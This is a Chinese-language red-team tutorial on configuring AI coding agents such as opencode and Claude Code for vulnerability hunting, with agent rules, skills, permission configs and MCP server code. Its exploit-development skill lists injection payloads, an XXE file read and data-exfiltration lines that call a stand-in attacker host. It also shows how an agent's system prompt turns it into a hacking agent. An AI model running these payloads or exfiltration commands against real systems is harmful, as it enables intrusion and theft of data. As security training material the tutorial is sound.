
学习目标:
  1. 理解AI Coding Agent的工作原理与改造方向
  2. 掌握 opencode 的红队定制化配置方法
  3. 学会编写安全审计专用的 Agent 规则与 Skill
  4. 理解 MCP 协议在安全工具集成中的作用
  5. 能独立搭建代码审计 & 侦察两用智能体
  6. 建立人机协同挖洞的工作流和思维方式

前提知识:
  熟悉 [[总目录与快速查询]] 中的基础知识
  具备 [[补充-Python黑客脚本基础]] 的编程能力
  了解至少一种 AI Coding Agent 的基本使用方式

## 一、引言：AI Coding Agent 的崛起与安全化改造

2024-2025年，AI编程助手进入了"智能体 (Agent)"时代。与传统的代码补全工具不同，
新一代 AI Coding Agent 具有以下关键能力:

  
    工具                  | 核心模型      | 平台    |  开源   |
  
    opencode              | Claude 4      | CLI     |       |
    Claude Code (Anthropic)| Claude 4      | CLI     |       |
    Cursor                | GPT-4/Claude  | IDE     |       |
    Windsurf (Codeium)    | 自研/Claude    | IDE     |       |
    GitHub Copilot Agent  | GPT-4o/Claude | IDE     |       |
    Cline (VSCode插件)     | 任意LLM       | IDE     |       |
    Aider                  | 任意LLM       | CLI     |       |
  

这些 Agent 的共同特征:
  - 可以读写文件 (创建/修改/删除代码)
  - 可以执行 Shell 命令 (编译/运行/测试)
  - 有规划能力 (Task → Subtask → Execute → Verify)
  - 支持自定义规则 (system prompt / rules / skills)
  - 支持 MCP 协议 (Model Context Protocol, 连接外部工具)

核心洞察:
  一个Coding Agent，本质上是一个「拥有编程能力 + 文件操作能力 +
  Shell执行能力」的自动化助手。你给它的 system prompt 决定了它的
  "人设"和"行为模式"。

  将 system prompt 从 "你是一个编程助手"
  改为       "你是一个安全审计专家，专门寻找代码中的漏洞"
  再配上     "你可以使用 nmap / sqlmap / nuclei 等安全工具"

  它就从 Coding Agent 变成了 挖洞 Agent。

## 二、AI智能体辅助挖洞的核心思路

【2.1 核心哲学: 不是替代人，而是倍增人】

  AI Agent 在红队中的定位:

     错误认知: "AI能自动挖洞，取代人类红队"
     正确认知: "AI负责执行繁琐的战术动作，人类负责战略判断"

  类比: AI Agent 之于红队队员，如同 exoskeleton 之于士兵
        — 你仍然需要做出所有关键决策，但体力活被大幅加速

【2.2 三种工作模式】

  模式一: 代码审计辅助 (Code Review Mode)
  
  将目标代码库交给 Agent，Agent 按照安全规则进行静态分析:
    - 数据流追踪: 从 source (用户输入) 到 sink (危险函数)
    - 模式匹配: SQL拼接、命令注入、反序列化等危险模式
    - 配置审计: 寻找硬编码密钥、弱加密算法、不安全的默认配置
    - 依赖分析: 检查第三方库的已知漏洞 (CVE)

  示例命令:
    $ opencode "审计 /home/user/webapp/ 目录下所有Python代码，
      重点关注SQL注入、命令注入、SSRF漏洞，给出具体危险点代码行号和利用思路"

  模式二: 自动化侦察 (Recon Mode)
  
  Agent 自动执行渗透测试的侦察阶段:
    - 子域名枚举 (subfinder, amass)
    - 端口扫描 (nmap, masscan)
    - Web路径发现 (ffuf, dirsearch)
    - 指纹识别 (whatweb, wappalyzer)
    - 信息编排 (生成结构化侦察报告)

  示例命令:
    $ opencode "对 example.com 执行完整侦察，
      包括子域名枚举、端口扫描、Web技术栈识别，
      生成 markdown 格式的侦察报告"

  模式三: 漏洞验证与利用开发 (Exploit Dev Mode)
  
  Agent 辅助编写漏洞验证脚本和 PoC:
    - 根据漏洞描述生成 PoC 代码
    - 自动化漏洞验证 (确认漏洞是否真实存在)
    - Shellcode 生成与 payload 构造
    - 利用链串联 (多个小漏洞组合成大影响)

  示例命令:
    $ opencode "针对这个 Django debug mode RCE 漏洞，
      编写一个 Python PoC 脚本，包含命令执行和反弹Shell两种模式"

【2.3 理想的人机协同工作流】

  
    人机协同红队工作流                       |
  
    |
    人类 (战略层)              AI Agent (战术层)              |
    |
    确定攻击面                →  执行端口扫描               |
    选择攻击路径              →  生成子域名列表             |
    判断漏洞危害              →  完成代码审计初筛           |
    制定利用策略              →  编写 PoC 脚本              |
    最终决策者                →  执行重复性测试             |
    承担责任                  →  生成技术报告               |
    |
    反馈: AI结果 ← 人类验证 ← AI优化 ← 人类新指令             |
    |
  

  关键原则: Human-in-the-Loop
    - Agent 每次执行危险操作 (如网络扫描、漏洞利用) 前需要人类确认
    - Agent 的所有输出都要经过人类审核
    - 人类对最终结果负全责

## 三、方案一: opencode 改造方案 (最实用方案)

【3.1 为什么选择 opencode】

  opencode 是目前最合适的红队 Agent 底座，原因如下:

     开源 (AGPL-3.0): 可以审查源码，放心用于安全研究
     CLI 原生: 适合服务器环境，不依赖 GUI IDE
     Claude 驱动: Anthropic Claude 在安全代码分析领域表现最佳
     MCP 支持: 可通过 Model Context Protocol 外接任意工具
     自定义 Agent/Skill: 通过配置文件定义专属安全角色
     本地运行: 代码和配置都在本地，保障项目隐私
     Arch Linux 兼容: yay -S opencode 一键安装

【3.2 opencode 配置文件体系】

  opencode 使用多层配置体系，优先级从高到低:

    ~/.config/opencode/opencode.json   ← 全局配置 (API Key、默认模型)
    项目根目录/.opencode/               ← 项目级配置目录
    项目根目录/AGENTS.md               ← Agent 角色定义文件

  .opencode/ 目录结构详解:

    项目根目录/.opencode/
     opencode.json     ← 项目级配置 (覆盖全局)
     agents/            ← 自定义 Agent 定义
      red-team.md   ← 红队 Agent
     skills/            ← 自定义 Skill 定义
      code-review.md      ← 代码审计技能
      recon.md            ← 侦察技能
      exploit-dev.md      ← 利用开发技能
     mcp-servers/      ← MCP 服务器配置

【3.3 实战: 配置红队专用 Agent】

  步骤一: 创建 .opencode/agents/red-team.md

```markdown
# Red Team Security Agent

你是一个资深红队安全研究员，专门从事渗透测试和漏洞挖掘。
你拥有15年以上的安全审计经验，精通以下领域:
- Web 应用安全 (OWASP Top 10)
- 代码审计 (Python, Java, PHP, JavaScript, Go, Rust)
- 网络渗透测试 (内外网)
- 漏洞利用开发 (Exploit Development)
- 云安全 (AWS, GCP, Azure)
- Active Directory 攻击

## 行为准则

1. 安全第一: 在执行任何网络扫描或漏洞利用操作前，必须获得用户确认
2. 精确输出: 提供具体的行号、代码片段、修复建议，而非笼统描述
3. 思维透明: 展示推理过程，让用户理解你为何认为某处存在漏洞
4. 尊重边界: 仅操作用户指定的目标范围
5. 隐私保护: 所有分析在本地完成，不将代码上传到外部服务

## 审计方法论

当你审计代码时，遵循以下系统化流程:

### Phase 1: 攻击面识别 (Attack Surface Mapping)
- 识别所有外部输入点 (HTTP参数、文件上传、API端点、WebSocket)
- 识别认证和授权机制
- 识别敏感操作 (数据库查询、文件读写、命令执行、反序列化)
- 识别第三方依赖及其版本

### Phase 2: 数据流追踪 (Data Flow Analysis)
对于每个外部输入点:
  1. 追踪数据从 source 到 sink 的完整路径
  2. 检查路径上的所有过滤/转换操作
  3. 判断是否存在绕过过滤的可能

常用 source 函数:
  Python: request.args, request.form, input(), os.environ
  PHP:    $_GET, $_POST, $_REQUEST, $_COOKIE, $_FILES
  Java:   request.getParameter(), @RequestParam
  JS:     req.query, req.body, req.params, window.location

常用 sink 函数:
  Python: os.system(), subprocess.call(), eval(), exec(), pickle.loads()
  PHP:    system(), exec(), shell_exec(), eval(), unserialize()
  Java:   Runtime.exec(), ProcessBuilder, JNDI lookup
  JS:     eval(), Function(), child_process.exec(), vm.runInNewContext()

### Phase 3: 模式匹配 (Pattern Recognition)
检查以下漏洞模式:
  - SQL 注入: 字符串拼接构建 SQL 语句
  - 命令注入: 用户输入进入系统命令
  - XSS: 未转义的用户输入进入 HTML 输出
  - SSRF: 用户可控的 URL 被服务端请求
  - 路径遍历: 用户输入影响文件路径
  - 反序列化: 不可信数据被反序列化
  - IDOR: 无权限检查的直接对象引用
  - 认证绕过: 逻辑缺陷导致跳过认证
  - 密钥泄露: 硬编码的 API Key / 密码 / 私钥

### Phase 4: 上下文验证 (Context Validation)
- 确认漏洞是否可被外部触发
- 评估利用条件 (是否需要认证、特定配置等)
- 判断实际危害等级 (CVSS 评分思路)

## 输出格式

发现漏洞时，使用以下格式:

**漏洞名称**: [简短描述]
**严重程度**:  严重 /  高危 /  中危 /  低危
**文件位置**: [文件路径:行号]
**漏洞类型**: [SQL注入 / 命令注入 / XSS / SSRF / ...]
**危险代码**:
` ` `[语言]
[具体的危险代码片段]
` ` `
**数据流**:
  Source: [用户输入来源] → [中间处理] → Sink: [危险函数]
**利用条件**: [是否需要认证 / 特定配置]
**修复建议**:
  1. [具体修复方案1]
  2. [具体修复方案2]
**参考**: [CWE编号] [OWASP分类]
```

  步骤二: 配置 .opencode/opencode.json

```json
{
  "model": "claude-sonnet-4-20250514",
  "agent": "agents/red-team.md",
  "permissions": {
    "allow": [
      "Bash(nmap:*)",
      "Bash(sqlmap:*)",
      "Bash(nuclei:*)",
      "Bash(ffuf:*)",
      "Bash(subfinder:*)",
      "Bash(whatweb:*)",
      "Bash(curl:*)",
      "Bash(python3:*)",
      "Bash(git:*)",
      "Bash(docker:*)",
      "Read",
      "Write",
      "Edit",
      "WebFetch",
      "Grep",
      "Glob"
    ],
    "deny": [
      "Bash(rm:*)",
      "Bash(shutdown:*)",
      "Bash(reboot:*)",
      "Bash(dd:*)",
      "Bash(mkfs:*)",
      "Bash(:(){ :|:& };:)"
    ],
    "ask": [
      "Bash(nmap:-p-:*)",
      "Bash(sqlmap:--os-shell:*)",
      "Bash(msfconsole:*)",
      "Bash(exploit:*)"
    ]
  },
  "mcpServers": {
    "nmap": {
      "command": "python3",
      "args": ["/home/a/成长为一个红队/mcp-servers/nmap-server.py"]
    },
    "vuln-db": {
      "command": "python3",
      "args": ["/home/a/成长为一个红队/mcp-servers/vulndb-server.py"]
    },
    "web-fetch": {
      "command": "python3",
      "args": ["/home/a/成长为一个红队/mcp-servers/webfetch-server.py"]
    }
  }
}
```

  步骤三: 创建红队专用 Skill

  `.opencode/skills/code-review.md` — 代码审计技能:

```markdown
# Skill: 安全代码审计 (Security Code Review)

你正在执行专业的源代码安全审计。系统化地检查代码库中的安全漏洞。

## 审计检查清单

### 1. 输入验证 (Input Validation)
- [ ] 所有外部输入是否有类型校验？
- [ ] 是否有正则表达式白名单验证？
- [ ] 文件上传是否检查 MIME 类型和文件内容？
- [ ] 是否检查输入长度限制？

### 2. 注入缺陷 (Injection Flaws)
- [ ] SQL 查询是否使用参数化查询 / ORM？
- [ ] 系统命令是否避免拼接用户输入？
- [ ] LDAP / XPath / OS 命令是否有注入防护？
- [ ] 模板引擎是否限制表达式执行？(SSTI)

### 3. 认证与会话 (Authentication & Session)
- [ ] 密码是否使用强哈希算法 (bcrypt, argon2)？
- [ ] 是否存在硬编码的凭证？
- [ ] Session Token 是否随机且不可预测？
- [ ] 是否有时效限制和登出功能？
- [ ] 多因素认证是否强制？

### 4. 授权 (Authorization)
- [ ] 每个 API 端点是否检查权限？
- [ ] 是否存在 IDOR (不安全的直接对象引用)？
- [ ] 水平越权和垂直越权是否防护？
- [ ] JWT 验证是否完整 (签名 + 过期时间)？

### 5. 加密 (Cryptography)
- [ ] 是否使用行业标准的加密算法 (AES-GCM, ChaCha20)？
- [ ] 是否避免使用 MD5/SHA1 作为安全用途？
- [ ] 密钥是否安全存储 (非硬编码)？
- [ ] 随机数是否使用密码学安全生成器？
- [ ] 证书验证是否完整 (无 curl_setopt CURLOPT_SSL_VERIFYPEER false)？

### 6. 敏感数据 (Sensitive Data)
- [ ] 日志中是否包含密码/Token/密钥？
- [ ] 错误信息是否泄露内部信息？
- [ ] 内存中的敏感数据是否及时清除？
- [ ] 数据传输是否使用 TLS？

### 7. 配置安全 (Configuration)
- [ ] Debug 模式是否在生产环境关闭？
- [ ] 默认账户/密码是否已修改？
- [ ] 目录列表是否禁用？
- [ ] CORS 配置是否过于宽松 (Access-Control-Allow-Origin: *)？

### 8. 依赖安全 (Dependencies)
- [ ] 检查 requirements.txt / package.json / pom.xml 中的依赖版本
- [ ] 是否有已知漏洞的版本？
- [ ] 是否及时更新安全补丁？

## 执行流程

1. 首先要求用户指定审计目标和语言
2. 扫描项目结构，识别技术栈
3. 逐一检查上述清单中的每一项
4. 对发现的每个问题，给出:
   - 具体文件和行号
   - 危险代码片段
   - 漏洞触发条件
   - 修复方案 (含代码示例)
5. 最后生成完整的审计报告

## 语言特定关注点

### Python
- eval(), exec(), compile() — 代码注入
- pickle.loads(), yaml.load() — 反序列化
- os.system(), subprocess.call(shell=True) — 命令注入
- template.render() — SSTI (Jinja2)
- sqlite3.execute(f"SELECT * FROM {table}") — SQL注入

### PHP
- system(), exec(), passthru(), shell_exec(), 反引号 — 命令注入
- unserialize() — 反序列化
- include/require 动态路径 — LFI/RFI
- extract(), parse_str() — 变量覆盖
- assert() — 代码执行 (PHP 7.x)

### Java
- Runtime.getRuntime().exec() — 命令注入
- ObjectInputStream.readObject() — 反序列化
- InitialContext.lookup() — JNDI注入 (Log4Shell)
- XPath.evaluate() — XPath注入
- Statement.executeQuery() (非 PreparedStatement) — SQL注入

### JavaScript/Node.js
- eval(), new Function() — 代码注入
- child_process.exec(), spawn() — 命令注入
- vm.runInNewContext() — 沙箱逃逸
- JSON.parse() on untrusted schema — 原型污染
- MongoDB $where 操作符 — NoSQL注入
```

  `.opencode/skills/recon.md` — 侦察技能:

```markdown
# Skill: 自动化侦察 (Automated Reconnaissance)

你正在对目标执行系统化的信息侦察。遵循结构化的侦察流程，
使用专业的安全工具，输出可操作的侦察情报。

## 侦察流程

### Phase 0: 目标确认
- 确认目标域名/IP范围
- 确认测试授权 (必须是已授权目标!)
- 确认侦察范围 (是否包含子域名、关联资产)

### Phase 1: 被动信息收集 (Passive Recon)
不使用直接与目标交互的方法:

- WHOIS 查询: whois target.com
- DNS 记录: dig ANY target.com
- 证书透明度: crt.sh 查询
- 搜索引擎: Google Dorking, Shodan, Censys
- 社交媒体: LinkedIn 员工信息, GitHub 代码泄露
- Wayback Machine: 历史页面快照

### Phase 2: 子域名枚举 (Subdomain Enumeration)
使用多种工具交叉验证:

1. 证书透明度 (快速, 被动):
   curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

2. DNS暴力枚举 (使用字典):
   subfinder -d example.com -o subs.txt
   amass enum -passive -d example.com -o amass_subs.txt
   puredns bruteforce ~/wordlists/subdomains-top1million-5000.txt example.com

3. DNS解析验证:
   cat all_subs.txt | sort -u | puredns resolve | tee resolved.txt

### Phase 3: 存活验证与指纹识别
验证哪些子域名存活，并识别技术栈:

- HTTP探测:
  cat resolved.txt | httpx -title -status-code -tech-detect -o alive.txt

- 截图预览:
  cat alive.txt | gowitness file -f - --no-http

- Web指纹:
  whatweb -i alive.txt --no-errors

### Phase 4: 端口扫描
对存活目标进行端口扫描:

- 快速扫描 (Top 1000端口):
  naabu -list resolved.txt -top-ports 1000 -o ports.txt

- 详细扫描 (针对性):
  nmap -sV -sC -p 22,80,443,8080,8443 -iL resolved.txt -oA detailed_scan

- 全量扫描 (关键目标):
  nmap -sV -sC -p- -T4 -iL critical_targets.txt -oA full_scan

### Phase 5: Web 路径发现
对 Web 服务进行目录/文件发现:

- 目录枚举:
  ffuf -w ~/wordlists/raft-large-directories.txt -u https://target.com/FUZZ -ac

- 文件枚举:
  ffuf -w ~/wordlists/raft-large-files.txt -u https://target.com/FUZZ -ac

- API端点发现:
  ffuf -w ~/wordlists/api-endpoints.txt -u https://api.target.com/FUZZ -ac

### Phase 6: 漏洞快速扫描
使用自动化扫描器进行快速漏洞发现:

- Nuclei 扫描:
  nuclei -list alive.txt -t ~/nuclei-templates/ -severity critical,high -o nuclei_results.txt

### Phase 7: 报告生成
整理所有发现，生成结构化侦察报告:

# 侦察报告: [目标名称]
**日期**: 2025-XX-XX
**范围**: example.com, *.example.com

## 资产清单
| 子域名 | IP | 端口 | 技术栈 | 状态码 | 标题 |
|--------|-----|------|--------|--------|------|
| ...    | ... | ...  | ...    | ...    | ...  |

## 关键发现
1. [发现1 — 暴露的服务/端口]
2. [发现2 — 过时技术栈]
3. [发现3 — 敏感信息泄露]

## 攻击面分析
- 外部攻击面: [总结]
- 潜在入口点: [列表]
- 推荐攻击路径: [优先级排序]
```

  `.opencode/skills/exploit-dev.md` — 利用开发技能:

```markdown
# Skill: 漏洞利用开发 (Exploit Development)

你正在开发漏洞验证脚本或利用代码。遵循安全性最高的开发实践，
确保 PoC 代码的安全性和可靠性。

## 开发原则

1. **无害优先**: PoC 默认只做无害验证 (如打印确认信息、DNS外带)
2. **可配置**: 目标URL/IP、端口、参数等必须可配置，禁止硬编码
3. **错误处理**: 完善的异常处理和超时机制
4. **日志记录**: 输出清晰的执行步骤和结果
5. **安全选项**: 危险操作 (反弹Shell、文件写入) 需要显式启用

## PoC 模板 (Python)

` ` `python
#!/usr/bin/env python3
"""
[漏洞名称] PoC
CVE: CVE-XXXX-XXXXX
影响版本: [软件名称] <= X.X.X
参考: https://example.com/advisory
"""

import argparse
import requests
import sys
from urllib.parse import urljoin

# 禁用 SSL 警告 (仅用于授权测试)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(target_url, timeout=10):
    """检查目标是否存在漏洞 (无害验证)"""
    # TODO: 实现漏洞检测逻辑
    pass

def exploit(target_url, command, timeout=10):
    """执行利用 (需要显式启用)"""
    # TODO: 实现利用逻辑
    pass

def main():
    parser = argparse.ArgumentParser(description="[CVE-XXXX-XXXXX] PoC")
    parser.add_argument("-u", "--url", required=True, help="目标URL")
    parser.add_argument("-c", "--command", help="要执行的命令 (利用模式)")
    parser.add_argument("--check", action="store_true", help="仅检测漏洞存在性")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时")
    parser.add_argument("--proxy", help="代理地址 (如 http://127.0.0.1:8080)")

    args = parser.parse_args()

    session = requests.Session()
    if args.proxy:
        session.proxies = {"http": args.proxy, "https": args.proxy}
    session.verify = False

    if args.check or not args.command:
        print("[*] 检测模式: 验证漏洞存在性")
        if check_vulnerability(args.url, args.timeout):
            print("[+] 目标存在漏洞!")
        else:
            print("[-] 目标似乎不受影响")
    else:
        print(f"[!] 利用模式: 执行命令 '{args.command}'")
        result = exploit(args.url, args.command, args.timeout)
        print(f"[+] 命令输出:\n{result}")

if __name__ == "__main__":
    main()
` ` `

## 常用 Payload 模式

### 命令注入
  ; id
  | whoami
  ` ` `command` ` `
  $(whoami)
  && cat /etc/passwd

### SQL 注入 (通用)
  ' OR '1'='1' --
  ' UNION SELECT 1,2,3 --
  '; WAITFOR DELAY '0:0:5' --
  1' AND SLEEP(5) --

### SSTI (模板注入)
  {{7*7}}
  ${7*7}
  <%= 7*7 %>
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

### XXE (XML外部实体)
  <!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>

### 反序列化
  Python: pickle (__reduce__)
  Java: ysoserial 生成链
  PHP: 魔术方法 __wakeup / __destruct
  Node.js: node-serialize, js-yaml

## 外带数据 (OOB) 技巧

当无法直接获取命令输出时:

  1. DNS 外带:
     nslookup `whoami`.attacker.com

  2. HTTP 外带:
     curl http://attacker.com/$(cat /etc/passwd|base64)

  3. ICMP 外带:
     (使用 icmpsh 或自定义脚本)
```

【3.4 MCP 服务器集成】

  MCP (Model Context Protocol) 是 Anthropic 发布的标准化协议，
  用于让 LLM 与外部工具通过 JSON-RPC 通信。

  下例展示如何将 nmap 封装为 MCP 服务器:

```python
#!/usr/bin/env python3
"""
MCP Server for Nmap Integration
将 nmap 封装为 MCP 服务器，使 opencode 可以直接调用 nmap 进行端口扫描。

依赖: pip install mcp nmap
"""

import json
import subprocess
import sys
from mcp.server import Server, NotificationOptions
from mcp.server.models import InitializationCapabilities
from mcp.server.stdio import stdio_server

server = Server("nmap-server")

# 定义可用工具列表
@server.list_tools()
async def handle_list_tools():
    return {
        "tools": [
            {
                "name": "nmap_quick_scan",
                "description": "快速端口扫描: 扫描目标的Top 1000端口",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "description": "目标IP或域名"
                        }
                    },
                    "required": ["target"]
                }
            },
            {
                "name": "nmap_full_scan",
                "description": "全端口扫描 + 服务版本检测: 扫描所有65535个端口并识别服务",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "description": "目标IP或域名"
                        }
                    },
                    "required": ["target"]
                }
            },
            {
                "name": "nmap_script_scan",
                "description": "NSE脚本扫描: 对指定端口运行安全检测脚本",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "target": {
                            "type": "string",
                            "description": "目标IP或域名"
                        },
                        "ports": {
                            "type": "string",
                            "description": "端口列表 (如 '22,80,443')"
                        },
                        "scripts": {
                            "type": "string",
                            "description": "NSE脚本类别 (如 'vuln,auth,default')"
                        }
                    },
                    "required": ["target", "ports"]
                }
            }
        ]
    }

# 处理工具调用
@server.call_tool()
async def handle_call_tool(name: str, arguments: dict):
    if name == "nmap_quick_scan":
        target = arguments.get("target")
        cmd = ["nmap", "-T4", "-sV", "--top-ports", "1000", target]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return result.stdout

    elif name == "nmap_full_scan":
        target = arguments.get("target")
        cmd = ["nmap", "-T4", "-sV", "-sC", "-p-", target]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        return result.stdout

    elif name == "nmap_script_scan":
        target = arguments.get("target")
        ports = arguments.get("ports", "22,80,443")
        scripts = arguments.get("scripts", "vuln")
        cmd = ["nmap", "-T4", "--script", scripts, "-p", ports, target]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout

    else:
        raise ValueError(f"Unknown tool: {name}")

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(
            read_stream,
            write_stream,
            InitializationCapabilities(
                sampling={},
                experimental={},
                roots={}
            ),
            NotificationOptions()
        )

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
```

【3.5 知识库 MCP 服务器示例】

  将 CVE 数据库封装为可查询的 MCP 服务:

```python
#!/usr/bin/env python3
"""
MCP Server for Vulnerability Database Queries
提供 CVE 查询、漏洞搜索、利用代码检索功能
"""

import json
import sqlite3
import requests
from mcp.server import Server
from mcp.server.stdio import stdio_server

server = Server("vulndb-server")

# 初始化 CVE 数据库
DB_PATH = "/home/a/成长为一个红队/data/cve.db"

@server.list_tools()
async def handle_list_tools():
    return {
        "tools": [
            {
                "name": "search_cve",
                "description": "搜索CVE漏洞信息",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "keyword": {
                            "type": "string",
                            "description": "搜索关键词 (产品名/漏洞类型)"
                        },
                        "severity": {
                            "type": "string",
                            "enum": ["CRITICAL", "HIGH", "MEDIUM", "LOW"],
                            "description": "最低严重程度"
                        },
                        "limit": {
                            "type": "integer",
                            "description": "返回结果数量 (默认10)",
                            "default": 10
                        }
                    },
                    "required": ["keyword"]
                }
            },
            {
                "name": "get_exploit",
                "description": "搜索Exploit-DB获取漏洞利用代码",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "cve_id": {
                            "type": "string",
                            "description": "CVE编号 (如 CVE-2021-44228)"
                        }
                    },
                    "required": ["cve_id"]
                }
            },
            {
                "name": "check_version",
                "description": "检查特定软件版本是否存在已知CVE",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "software": {
                            "type": "string",
                            "description": "软件名称"
                        },
                        "version": {
                            "type": "string",
                            "description": "版本号"
                        }
                    },
                    "required": ["software", "version"]
                }
            }
        ]
    }

@server.call_tool()
async def handle_call_tool(name: str, arguments: dict):
    conn = sqlite3.connect(DB_PATH)

    if name == "search_cve":
        keyword = arguments["keyword"]
        limit = arguments.get("limit", 10)
        cursor = conn.execute(
            "SELECT cve_id, description, cvss_score, published_date "
            "FROM cves WHERE description LIKE ? ORDER BY cvss_score DESC LIMIT ?",
            (f"%{keyword}%", limit)
        )
        results = []
        for row in cursor:
            results.append({
                "cve_id": row[0],
                "description": row[1],
                "cvss_score": row[2],
                "published": row[3]
            })
        conn.close()
        return json.dumps(results, indent=2)

    elif name == "get_exploit":
        cve_id = arguments["cve_id"]
        # 查询本地 exploit-db 镜像
        try:
            resp = requests.get(
                f"https://exploit-db.com/search?cve={cve_id}",
                timeout=10
            )
            return f"Exploit-DB 搜索结果: {resp.status_code}"
        except Exception as e:
            return f"查询失败: {str(e)}"

    elif name == "check_version":
        software = arguments["software"]
        version = arguments["version"]
        cursor = conn.execute(
            "SELECT cve_id, description, cvss_score FROM cves "
            "WHERE software = ? AND version = ? ORDER BY cvss_score DESC",
            (software, version)
        )
        results = list(cursor.fetchall())
        conn.close()
        if not results:
            return f"未找到 {software} {version} 的已知CVE"
        return json.dumps([
            {"cve_id": r[0], "description": r[1], "cvss": r[2]}
            for r in results
        ], indent=2)

    conn.close()
    raise ValueError(f"Unknown tool: {name}")
```

【3.6 opencode 的优势与劣势】

  优势:
     完全本地运行，代码不经过第三方服务器
     开源可审计，可信度高
     MCP 生态丰富，可对接任意工具
     自定义能力强 (Agent / Skill / Rules 三层配置)
     Arch Linux 原生支持

  劣势:
     需要 Claude API Key (付费，约 $3/小时)
     需要一定的配置文件编写能力
     中文场景下输出质量略逊于 GPT-4 系列
     大规模代码库审计时 Token 消耗大

## 四、方案二: Claude Code / Cursor 改造方案

【4.1 Claude Code (Anthropic 官方 CLI)】

  Claude Code 是 Anthropic 推出的官方 CLI Agent，与 opencode 类似但由官方维护。

  配置文件: 项目根目录下的 `CLAUDE.md`

```markdown
# CLAUDE.md — 红队安全审计配置

## 角色定义
你是一个资深红队安全研究员。你的工作是:
1. 审计源代码中的安全漏洞
2. 编写漏洞利用 PoC
3. 执行授权的渗透测试侦察
4. 生成专业的安全测试报告

## 安全工作流

### 代码审计时:
- 使用语义分析而非简单正则匹配
- 追踪完整的数据流: 外部输入 → 内部处理 → 危险函数
- 每个发现必须包含: 文件路径、行号、漏洞类型、危险代码、修复方案
- 优先关注 OWASP Top 10 和 CWE Top 25

### 执行侦察时:
- 使用被动手段优先 (被动 > 主动)
- 低频慢速扫描，避免触发 WAF/IDS
- 记录所有操作的时间戳和结果
- 生成结构化报告 (Markdown 表格)

### 编写 PoC 时:
- 默认只做无害验证
- 所有目标参数通过命令行传入
- 添加清晰的使用说明和免责声明
- 包含超时和异常处理

## 工具使用规则

### 允许的安全工具:
- nmap (端口扫描，必须限速)
- sqlmap (仅检测，不使用 --os-shell)
- ffuf/gobuster (目录枚举)
- nuclei (漏洞扫描)
- Python/Go 自定义脚本

### 禁止的操作:
- 对非授权目标进行任何测试
- 使用 DDoS 工具
- 破坏目标系统或数据
- 上传 webshell 到非授权目标

## 输出规范
- 漏洞发现: 按 CVSS 严重程度排序
- Markdown 表格记录进度
- 每个漏洞独立一个代码块
- 修复建议要可操作 (能直接粘贴给开发团队)
```

【4.2 Cursor 规则配置】

  Cursor 使用 `.cursorrules` 文件:

```
# .cursorrules — 红队代码审计配置

你是一个安全审计专家。在处理代码时:

1. 首先识别所有用户输入点 (API参数、表单字段、URL参数、Cookie等)
2. 追踪每个输入点到危险函数的完整数据流
3. 检查以下漏洞类型:
   - CWE-89: SQL注入
   - CWE-78: OS命令注入
   - CWE-79: XSS
   - CWE-918: SSRF
   - CWE-22: 路径遍历
   - CWE-502: 不安全反序列化
   - CWE-287: 认证绕过
   - CWE-639: IDOR
   - CWE-798: 硬编码凭证
   - CWE-200: 敏感信息泄露

4. 对每个发现给出:
   - 文件路径和行号
   - 漏洞触发条件
   - CVSS 3.1 评分 (提供向量字符串)
   - 具体修复代码

5. 重点关注:
   - 认证和授权逻辑 (最常见的致命缺陷)
   - 输入验证和输出编码
   - 加密实现
   - 错误处理中的信息泄露
```

  Cursor 支持的模式:
    - Chat: 选中代码 → Cmd+K → 输入"审计此代码的安全漏洞"
    - Composer: 对多个文件进行关联分析
    - Agent: 让 Cursor 自动搜索项目中的安全漏洞

  Windsurf (Codeium) 配置类似，使用 `.windsurfrules` 文件:

```
# .windsurfrules

You are a security-focused code reviewer.
For every file you analyze:

1. Map the attack surface (external inputs, API endpoints)
2. Trace data flow from sources to sinks
3. Flag any dangerous function calls
4. Identify missing security controls
5. Suggest concrete fixes with code examples

Focus on finding:
- Injection vulnerabilities (SQL, Command, LDAP, XPath)
- Authentication/Authorization flaws
- Cryptography weaknesses
- Information disclosure via error messages/logs
- Unsafe deserialization
- XXE vulnerabilities
- Server-side request forgery (SSRF)

Report format:
FILE: <path>
LINE: <number>
SEVERITY: <critical/high/medium/low>
CWE: <id>
FINDING: <description>
FIX: <code example>
```

【4.3 方案二的优势与劣势】

  优势:
     Claude Code / Cursor 生态成熟，稳定可靠
     IDE 集成度高 (Cursor)，交互体验好
     官方维护，更新及时
     社区资源丰富 (Cursor Rules 仓库等)

  劣势:
     闭源 (存在隐私风险，代码可能上传)
     Cursor/Windsurf 需付费订阅
     规则系统不如 opencode 灵活 (Agent/Skill/MCP)
     无法集成外部安全工具 (MCP 支持有限或不存在)

## 五、方案三: 自建RAG加持的挖洞Agent

【5.1 架构设计】

  如果你需要完全自主可控的挖洞 Agent，可以自建 RAG 系统:

  
    自建挖洞Agent架构                         |
  
    |
    |
    |  用户输入  |→|  编排层    |→|   LLM (决策引擎)    |    |
    |  (自然语言)|   | (LangChain)|   | Claude / GPT /本地 |    |
    |
    |                   |               |
    |
    |            |                   |       |       |
    |
    |
    |  RAG 知识库 | |  工具层   | |  记忆层  | |  执行器    |  |
    |  | |  | |  | |  |  |
    | • CVE/NVD | | • nmap   | | • 对话史 | | • 命令执行 |  |
    | • Exploit  | | • sqlmap | | • 发现记 | | • 文件操作 |  |
    | • ATT&CK  | | • nuclei | | • 工具结 | | • 结果解析 |  |
    | • OWASP   | | • ffuf   | | • 漏洞台 | | • 报告生成 |  |
    | • Payloads| | • 自定义  | |          | |           |  |
    |
    |
  

